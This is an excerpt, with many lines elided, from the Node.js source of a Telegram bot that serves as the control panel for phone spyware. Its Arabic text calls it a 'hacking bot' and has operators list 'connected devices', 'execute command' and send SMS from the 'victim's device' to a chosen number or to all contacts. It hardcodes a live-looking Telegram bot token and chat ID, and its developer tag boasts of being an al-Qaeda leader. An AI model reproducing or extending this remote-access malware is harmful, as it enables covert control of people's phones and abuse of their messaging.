...
const token = '8295619772:AAFivgbxXI3viMoCgiAYtdeULmwBR7Z668k'
const id = '7900627755'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : عبد المالك التوهامي 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : </h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور عبد المالك التوهامي 𓅓𓆪𓆪 𖤛ᴠɪᴘ عبد المالك التوهامي : @Us_HC693 ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
        ...
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            ...
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور عبد المالك التوهامي 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Us_HC693 ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت زعيم تنظيم القاعدة 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Us_HC693\n\n' +
